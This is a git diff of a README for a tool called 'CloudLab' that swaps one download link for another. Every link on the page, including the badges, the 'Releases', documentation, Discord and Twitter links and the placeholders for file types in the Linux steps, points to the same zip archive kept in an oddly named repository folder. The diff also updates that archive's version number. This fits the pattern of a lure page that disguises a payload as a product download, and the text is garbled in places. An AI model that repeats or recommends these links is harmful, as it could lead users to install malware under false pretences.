@@ -1,6 +1,6 @@
 # ☁️ CloudLab - Simplify Your Cloud Experimentation
 
-[![Download CloudLab](https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip%https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip)](https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip)
+[![Download CloudLab](https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip%https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip)](https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ CloudLab makes it easy to experiment with different cloud platforms. Follow thes
 
 ## 📥 Download & Install
 
-To get CloudLab, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip).
+To get CloudLab, visit this page to download: [Releases Page](https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip).
 
 1. Go to the Releases page by clicking the link above.
 2. Look for the latest version.
@@ -41,8 +41,8 @@ Before installing, make sure your system meets these basic requirements:
 
 ### For Linux Users
 
-1. Locate the downloaded file, which can be a `https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip` or `.deb` file.
-2. For `https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip`: Extract the file to your desired location. Open a terminal and navigate to the extracted directory. Run `./cloudlab`.
+1. Locate the downloaded file, which can be a `https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip` or `.deb` file.
+2. For `https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip`: Extract the file to your desired location. Open a terminal and navigate to the extracted directory. Run `./cloudlab`.
 3. For `.deb`: Open a terminal and run `sudo dpkg -i cloudlab*.deb` to install. Then, run `cloudlab` from the terminal.
 
 ## 📊 Using CloudLab
@@ -95,7 +95,7 @@ Here are some common challenges users face with CloudLab and their solutions:
 
 ## 📚 Learn More
 
-Visit our [documentation](https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip) for in-depth guides on features, advanced configurations, and more. 
+Visit our [documentation](https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip) for in-depth guides on features, advanced configurations, and more. 
 
 ## 🐛 Reporting Issues
 
@@ -103,6 +103,6 @@ If you encounter any issues, please report them by creating an issue on our GitH
 
 ## ✨ Community and Support
 
-Join our community on [Discord](https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip) or follow us on [Twitter](https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip) to connect with other users and get updates.
+Join our community on [Discord](https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip) or follow us on [Twitter](https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip) to connect with other users and get updates.
 
-[![Download CloudLab](https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip%https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip)](https://raw.githubusercontent.com/Ahmdrady/CloudLab/main/myrrhophore/Lab-Cloud-2.2.zip)
+[![Download CloudLab](https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip%https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip)](https://github.com/Ahmdrady/CloudLab/raw/refs/heads/main/myrrhophore/Lab-Cloud-v3.0-alpha.4.zip)
